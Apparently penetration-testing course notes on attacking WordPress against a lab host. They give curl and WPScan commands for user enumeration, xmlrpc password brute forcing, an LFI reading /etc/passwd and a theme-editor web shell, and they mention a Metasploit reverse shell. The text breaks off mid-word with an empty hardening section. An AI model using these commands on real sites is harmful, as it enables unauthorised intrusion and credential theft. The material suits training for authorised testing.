# Enumeration
## WordPress Core Version Enumeration
The first and easiest step is reviewing the page source code. We can do this by right-clicking anywhere on the current page and selecting "View page source" from the menu or using the keyboard shortcut [CTRL + U].
```
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
```
## Plugins and Themes Enumeration
## Directory Indexing
We can also view the directory listing using cURL and convert the HTML output to a nice readable format using html2text.
```
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```
## User Enumeration
Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.
### First Method
The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username
The `admin` user is usually assigned the user ID `1`. We can confirm this by specifying the user ID for the `author` parameter in the URL.

```
http://blog.inlanefreight.com/?author=1
```

This can also be done with cURL from the command line. The HTTP response in the below output shows the author that corresponds to the user ID. The URL in the Location header confirms that this user ID belongs to the admin user.
```
curl -s -I http://blog.inlanefreight.com/?author=1
```
The above cURL request then redirects us to the user's profile page or the main login page. If the user does not exist, we receive a 404 Not Found error.
### Second Method
The second method requires interaction with the JSON endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default.
```
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```
## Login
Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the xmlrpc.php page.
If our POST request against xmlrpc.php contains valid credentials, we will receive the following output:
```
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
If the credentials are not valid, we will receive a 403 faultCode error.
## WPScan Enumeration
### Enumerating a Website with WPScan
The --enumerate flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let's run a normal enumeration scan against a WordPress website.
```
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```
# Exploitation
## Exploiting a Vulnerable Plugin
### Leveraging WPScan Results
The report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called Twenty Twenty. WPScan identified two vulnerable plugins, Mail Masta 1.0 and Google Review Slider. This version of the Mail Masta plugin is known to be vulnerable to SQL Injection as well as Local File Inclusion (LFI). The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities.
Let's verify if the LFI can be exploited based on this exploit-db report. The exploit states that any unauthenticated user can read local files through the path:
```
/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd.
```
#### LFI using cURL
```
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
## Attacking WordPress Users
### WordPress User Bruteforce
WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: admin, roger, and david. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.
#### WPscan - XMLRPC
```
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```
## Remote Code Execution (RCE) via the Theme Editor
### Attacking the WordPress Backend
With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.
We can see that the active theme is Transportex so an unused theme such as Twenty Seventeen should be chosen instead.
Choose a theme and click on Select. Next, choose a non-critical file such as 404.php to modify and add a web shell.
```
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
## Attacking WordPress with Metasploit
### Automating WordPress Exploitation
To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:
After using the set command to make the necessary modifications, we can use the run command to execute the module. If all of our parameters are set correctly, it will spawn a reverse sh
# WordPress Hardening